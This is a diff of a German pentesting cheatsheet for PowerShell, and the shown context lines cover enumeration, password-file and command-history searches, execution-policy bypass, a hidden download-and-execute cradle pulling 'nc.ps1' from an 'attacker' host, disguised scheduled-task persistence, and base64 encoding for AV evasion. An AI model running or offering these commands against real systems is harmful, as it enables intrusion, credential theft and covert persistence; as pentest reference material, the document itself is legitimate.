@@ -6,7 +6,7 @@ Dieses Cheatsheet bietet eine schnelle Referenz für den **Einsatz von PowerShel
 
 > Hinweis: PowerShell ist ein äußerst mächtiges Werkzeug – bitte **nur in autorisierten Umgebungen** einsetzen!
 
----
+
 
 ## Inhaltsverzeichnis
 
@@ -25,7 +25,7 @@ Dieses Cheatsheet bietet eine schnelle Referenz für den **Einsatz von PowerShel
 - [Verknüpfte Dateien im Repository](#verknüpfte-dateien-im-repository)
 - [Haftungsausschluss](#haftungsausschluss)
 
----
+
 
 ## Systeminformationen
 
@@ -36,7 +36,7 @@ hostname
 Get-WmiObject -Class Win32_OperatingSystem
 ```
 
----
+
 
 ## Benutzer & Gruppen
 ```powershell
@@ -47,7 +47,7 @@ net localgroup administrators
 Get-LocalGroupMember -Group "Administrators"
 ```
 
----
+
 
 <div align=right>
 
@@ -66,7 +66,7 @@ Get-NetFirewallRule
 Test-NetConnection -ComputerName <IP> -Port <Port>
 ```
 
----
+
 
 ## Dateisystem und Suche
 
@@ -76,7 +76,7 @@ dir -Recurse -Filter *password*
 Get-Content C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ```
 
----
+
 
 ## Prozesse & Dienste
 
@@ -87,7 +87,7 @@ Get-Service
 Get-WmiObject win32_service | Where { $_.State -eq "Running" }
 ```
 
----
+
 
 ## Execution Policies & Umgehung
 
@@ -97,7 +97,7 @@ Set-ExecutionPolicy Bypass -Scope Process
 powershell.exe -ExecutionPolicy Bypass -File script.ps1
 ```
 
----
+
 
 <div align=right>
 
@@ -118,7 +118,7 @@ Invoke-WebRequest "http://ip/script.ps1" -OutFile "script.ps1"
 powershell -NoP -NonI -W Hidden -Exec Bypass -Command IEX(New-Object Net.WebClient).DownloadString('http://attacker/nc.ps1')
 ```
 
----
+
 
 ## PowerShell Recon & Enum
 
@@ -151,7 +151,7 @@ Get-ScheduledTask | Where-Object {$_.TaskPath -like "*"}
 | `Empire`                  | PowerShell RAT Framework                 |
 | `Powersploit`             | Offensive Module-Sammlung                |
 
---- 
+ 
 
 <div align=right>
 
@@ -167,7 +167,7 @@ $trigger = New-ScheduledTaskTrigger -AtLogOn
 Register-ScheduledTask -TaskName "Updater" -Action $action -Trigger $trigger
 ```
 
---- 
+ 
 
 ## AV-Evasion Basics (nur zu Lernzwecken!)
 ```powershell
@@ -177,7 +177,7 @@ $encoded = [Convert]::ToBase64String($bytes)
 powershell -EncodedCommand $encoded
 ```
 
----
+
 
 ## Nützliche Module & Projekte
 
@@ -189,14 +189,14 @@ powershell -EncodedCommand $encoded
 | Empire         | [https://github.com/BC-SECURITY/Empire](https://github.com/BC-SECURITY/Empire)                                                           |
 | PowerSharpPack | [https://github.com/S3cur3Th1sSh1t/PowerSharpPack](https://github.com/S3cur3Th1sSh1t/PowerSharpPack)                                     |
 
----
+
 
 ## Verknüpfte Dateien im Repository
 - [windows_privilege_escalation.md](/04-os-enumeration/windows_privilege_escalation.md)
 - [linux_privilege_escalation.md](/04-os-enumeration/linux_privilege_escalation.md)
 - [red_team_tools.md](/05-red-teaming/red_team_tools.md)
 
----
+
 
 ## Haftungsausschluss
 
